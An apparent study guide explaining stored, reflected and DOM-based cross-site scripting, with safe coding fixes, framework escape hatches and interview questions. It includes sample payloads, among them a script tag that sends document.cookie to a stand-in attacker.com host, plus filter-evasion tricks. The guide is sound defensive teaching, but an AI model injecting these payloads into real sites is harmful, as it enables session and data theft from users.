# Cross-Site Scripting (XSS): DOM vs. Reflected vs. Stored

## Quick Reference

| Type | Payload origin | Server persists payload | Fix |
|---|---|---|---|
| Stored | Database | Yes | Output encode on render |
| Reflected | URL/query param | No | Output encode on render |
| DOM-based | Client-side JS | Never hits server | Avoid dangerous sinks |

---

## What Is This?

XSS (Cross-Site Scripting) is an attack where an attacker injects JavaScript into a page that runs in the victim's browser. The injected script runs with the full origin privileges of the target site — it can read cookies, localStorage, make authenticated requests, exfiltrate data, or redirect the user.

There are three forms depending on *where the payload lives* and *how it reaches execution*.

---

## Why It's Critical

XSS is consistently in the OWASP Top 10. A successful XSS attack against a user of your site gives the attacker full access to everything that site's JavaScript can access — session cookies (if not HttpOnly), auth tokens in localStorage, form data, and the ability to make API calls as the victim. On a banking site, that's account takeover. On a chat app, it's message exfiltration and credential theft.

> **Check yourself:** If a cookie is set with HttpOnly, can XSS steal it? What can XSS still do to that session?

---

## Stored XSS

The attacker saves malicious input to a persistent store (database, comment system, user profile). Every user who views that content executes the payload.

**Attack flow:**
1. Attacker submits: `<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>` as a comment
2. Server saves it to the database
3. Every user viewing the comments page gets the script injected into the HTML
4. Their browser executes it

**Most dangerous type** because it's persistent and affects every visitor, not just one victim who clicks a specific link.

**Fix:** Encode output when rendering to HTML. In most frameworks this is automatic:

```js
// React — automatically HTML-encodes:
function Comment({ text }) {
  return <p>{text}</p>; // text is encoded — no XSS
}

// The dangerous escape hatch:
function Comment({ html }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />; // bypasses encoding — XSS possible
}
```

---

## Reflected XSS

The payload is in the URL or request parameter. The server reflects it back in the HTML response — but only for that request. The attacker must trick the victim into visiting a crafted URL.

**Attack flow:**
1. Attacker crafts: `https://example.com/search?q=<script>stealCookie()</script>`
2. Server renders: `<p>Results for: <script>stealCookie()</script></p>` (unencoded)
3. Victim's browser executes the script
4. Attacker shares the malicious URL via email/phishing

**Less persistent** than stored XSS — requires social engineering to deliver. Mitigated by URL length limits and browsers' deprecated XSS Auditor filters (now mostly removed).

**Fix:** Same as stored — HTML-encode all user-controlled values in server responses.

```python
# Server-side (pseudo-code)
query = request.args.get('q')
# WRONG:
return f"<p>Results for: {query}</p>"
# CORRECT:
from html import escape
return f"<p>Results for: {escape(query)}</p>"
```

---

## DOM-Based XSS

The payload never reaches the server. The client-side JavaScript reads attacker-controlled data (URL fragment, query params, postMessage) and writes it to a dangerous DOM location.

**Attack flow:**
1. Attacker crafts: `https://example.com/page#<img src=x onerror=stealCookie()>`
2. Victim visits the URL
3. Client-side JS reads `location.hash` and does: `element.innerHTML = location.hash`
4. Browser parses the HTML, executes `onerror` handler
5. The malicious payload was never sent to the server — server-side sanitization can't help

**Dangerous sinks** — places where attacker-controlled data causes script execution:

```js
// DANGEROUS — these execute HTML/JS:
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);
document.writeln(userInput);
eval(userInput);
setTimeout(userInput, 0);       // when first arg is a string
setInterval(userInput, 0);      // when first arg is a string
new Function(userInput);
element.setAttribute('onclick', userInput);
el.src = userInput;            // if userInput is 'javascript:...'
el.href = userInput;           // if userInput is 'javascript:...'
location.href = userInput;     // if userInput is 'javascript:...'
```

**Safe alternatives:**

```js
// Safe — text content only:
element.textContent = userInput;   // no HTML parsing
element.innerText = userInput;     // same (with CSS visibility)

// Safe attribute setting for non-URL attributes:
element.setAttribute('data-value', userInput); // if not used in a dangerous context

// Safe URL setting (after validation):
const url = new URL(userInput, location.origin);
if (url.protocol === 'https:' || url.protocol === 'http:') {
  anchor.href = url.href;
}
```

---

## XSS Through HTML Attributes

Attribute context is a distinct injection point:

```html
<!-- Attacker controls the value of searchQuery -->
<input value="ATTACKER_CONTROLLED" />

<!-- If the value contains: " onmouseover="stealCookie() -->
<input value="" onmouseover="stealCookie()" />
<!-- ^ quote closes the value, new attribute injects event handler -->
```

Framework template engines handle this by HTML-encoding attribute values:

```html
<!-- Vue / Angular — safe: automatically encodes -->
<input :value="searchQuery" />
<!-- Rendered as: <input value="&quot; onmouseover=&quot;stealCookie()&quot;" /> -->
```

---

## XSS in JavaScript Context

If user data is embedded in a JavaScript string in HTML:

```html
<!-- WRONG — user data directly in script tag -->
<script>
  const username = "ATTACKER_VALUE";
  //                ^ if value contains: "; stealCookie(); //
  // Becomes: const username = ""; stealCookie(); // ";
</script>
```

Never embed user data directly in `<script>` blocks. Use a data attribute:

```html
<!-- Safe pattern: JSON in a data attribute, read in JS -->
<div id="app" data-config='{"user": "safe value"}'></div>
<script>
  const config = JSON.parse(document.getElementById('app').dataset.config);
</script>
```

Or use server-side JSON serialization with proper escaping (`</` → `<\/` to prevent `</script>` injection).

---

## Framework Protections and Where They Fail

Modern frameworks (React, Vue, Angular) encode HTML by default when rendering template expressions. But they all have escape hatches:

| Framework | Safe | Dangerous |
|---|---|---|
| React | `{value}` in JSX | `dangerouslySetInnerHTML` |
| Vue | `{{ value }}` | `v-html` directive |
| Angular | `{{ value }}` | `bypassSecurityTrustHtml` |

Always audit usages of these APIs. A legitimate use (rendering rich text from a CMS) should sanitize the HTML first:

```js
import DOMPurify from 'dompurify';

// React — safe rich text rendering
function RichText({ html }) {
  const sanitized = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

## Sanitization vs. Encoding

**Encoding** transforms characters that have special meaning in HTML into their entity equivalents: `<` → `&lt;`, `"` → `&quot;`. Used for text that should be *displayed*, not interpreted as HTML.

**Sanitization** parses HTML and removes dangerous elements/attributes while keeping safe structure. Used when you want to allow a subset of HTML (bold, links) but block scripts. DOMPurify is the standard library.

```js
DOMPurify.sanitize('<b>Bold</b><script>evil()</script>');
// → '<b>Bold</b>'  — script removed, bold preserved
```

Never write your own sanitizer. Allowlist-based sanitization (remove everything except known-safe tags) is the only safe approach. Denylist-based (remove `<script>`) fails against evasion techniques.

---

## Interview Questions

**Q (High): What is the difference between stored, reflected, and DOM-based XSS?**

Answer: The distinction is where the payload lives. Stored XSS saves the payload to a database; it executes for every user who views the infected content — persistent and high-impact. Reflected XSS puts the payload in a URL parameter; the server reflects it back unencoded in the HTML response, affecting only users tricked into visiting the crafted URL. DOM-based XSS never hits the server at all — client-side JavaScript reads attacker-controlled data from the URL hash, query params, or postMessage and writes it to a dangerous sink like `innerHTML`. Server-side input validation and encoding doesn't help with DOM XSS because the data bypasses the server entirely. Each type requires its own mitigation: output encoding on the server for stored/reflected, safe DOM APIs and client-side sanitization for DOM-based.

**Q (High): If a cookie is HttpOnly, can XSS still cause harm? What can and can't the attacker do?**

Answer: HttpOnly prevents JavaScript from reading the cookie value — `document.cookie` won't include it. So the attacker can't steal the session token as a string. However, the cookie is still sent automatically with every browser request to that origin. The attacker's injected JavaScript can make authenticated requests on behalf of the victim: fetch their private data, submit forms, change account settings, transfer funds, or read API responses (if CORS allows). The session is compromised — it's just compromised through the browser's own request mechanism rather than by exfiltrating the token. HttpOnly prevents *token theft* but not *session abuse*. Combined with CSP and SameSite cookies, the attack surface shrinks significantly, but HttpOnly alone does not stop a successful XSS attack.

**Q (High): What are DOM XSS sinks and why can server-side sanitization not prevent DOM XSS?**

Answer: A sink is any JavaScript API that processes a string as executable HTML or JavaScript: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location.href = 'javascript:...'`. When attacker-controlled data flows from a *source* (URL fragment, query parameter, postMessage, localStorage) to a *sink* without sanitization, the browser executes it as code. Server-side sanitization can't prevent this because the payload is never sent to the server — it travels directly from the URL to the client's JavaScript. The browser serves a completely clean HTML page from the server, and then the client's own JavaScript reads the malicious data from the URL and injects it into the DOM. The fix is in the client code: avoid dangerous sinks for user-controlled data, use `textContent` instead of `innerHTML`, and validate URLs before using them as `href`/`src`.

**Q (Medium): Why are allowlist-based HTML sanitizers safer than denylist-based ones?**

Answer: A denylist-based sanitizer removes known-dangerous patterns (`<script>`, `javascript:`, `onerror=`). Attackers have decades of techniques to evade denylists: `<sCrIpT>` (case variation), `java&#x73;cript:` (entity encoding), `<<script>>` (double-angle brackets parsed differently by different parsers), SVG `<animate>` elements that execute JavaScript, CSS `expression()` in old IE. The attack surface for denylist evasion is the full diversity of HTML parsing quirks across browsers. An allowlist-based sanitizer starts from zero — nothing is allowed — and explicitly permits only known-safe elements (`<b>`, `<i>`, `<a href>`) and attributes (`href`, but only with non-javascript protocols). Any unexpected input is stripped. The attack surface is "what's on the allowlist" which is entirely under the developer's control. DOMPurify uses an allowlist approach and is maintained by the security community.

**Q (Low): When is it safe to use `dangerouslySetInnerHTML` in React?**

Answer: When and only when you have sanitized the HTML with a trusted library like DOMPurify immediately before setting it. The full safe pattern: `const sanitized = DOMPurify.sanitize(untrustedHtml)` followed by `<div dangerouslySetInnerHTML={{ __html: sanitized }} />`. This is legitimate for rendering rich text from a CMS, WYSIWYG editor output, or markdown that's been converted to HTML. Never pass unsanitized user-controlled strings. Never sanitize once and cache the result long-term without re-sanitizing on use. The name `dangerouslySetInnerHTML` is intentional friction — it signals that every usage requires careful review.

---

## Self-Assessment

- [ ] Explain the three XSS types and what makes DOM XSS fundamentally different
- [ ] List five dangerous DOM sinks and their safe replacements
- [ ] Explain why HttpOnly cookies don't fully prevent XSS damage
- [ ] Describe when to use sanitization vs. encoding and name the correct library for sanitization
- [ ] Identify the unsafe escape hatch in React, Vue, and Angular templates

---
*Next: CSRF Protection Patterns — SameSite cookies, CSRF tokens, and when SPAs are safe by default.*
